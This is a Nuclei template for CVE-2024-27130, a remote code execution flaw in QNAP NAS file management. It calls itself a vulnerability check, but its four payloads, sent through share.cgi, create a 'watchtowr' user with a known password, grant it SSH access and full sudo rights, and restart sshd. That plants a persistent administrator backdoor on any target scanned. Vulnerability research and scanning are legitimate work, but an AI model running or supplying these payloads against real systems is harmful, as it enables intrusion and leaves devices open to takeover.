id: CVE-2024-27130

info:
  name: Remote Code Execution in NAS File Management in QNAP QuTSCloud c5.1.7.2739 build 20240419
  author: colcs25
  severity: high
  description: This template checks for Remote Code Execution (RCE) vulnerability via Buffer Overflow in NAS file management via the ssid parameter.
  command -> nuclei -t CVE-2024-27130.yaml -u (target URL) -var ssid=(ssid value)
  tags: rce, cve
  remediation: Fixed in QTS 5.1.7.2770 build 20240520
  reference:
    - https://github.com/watchtowrlabs/CVE-2024-27130
    - https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27130
   classification:
     cve-id: CVE-2024-27130
     cve-Base-Score: 7.2
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L
     
requests:
  - raw:
      - |
        POST /cgi-bin/filemanager/share.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        ssid={{ssid}}&func=get_file_size&total=1&path=/&name={{payload}}
    attack: pitchfork
    payloads:
      payload:
        - "/../../../../usr/local/bin/useradd -p '$(openssl passwd -6 password)' watchtowr #"
        - "/bin/sed -i -e 's/AllowUsers /AllowUsers watchtowr /' /etc/config/ssh/sshd_config #"
        - "/../../../../bin/echo watchtowr ALL=\\(ALL\\) ALL >> /usr/etc/sudoers #"
        - "/../../../../usr/bin/killall -SIGHUP sshd #"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words: 
          - "HTTP/1.1 200 OK"
        part: header
    extractors:
      - type: regex
        part: body
        regex:
          - "watchtowr"
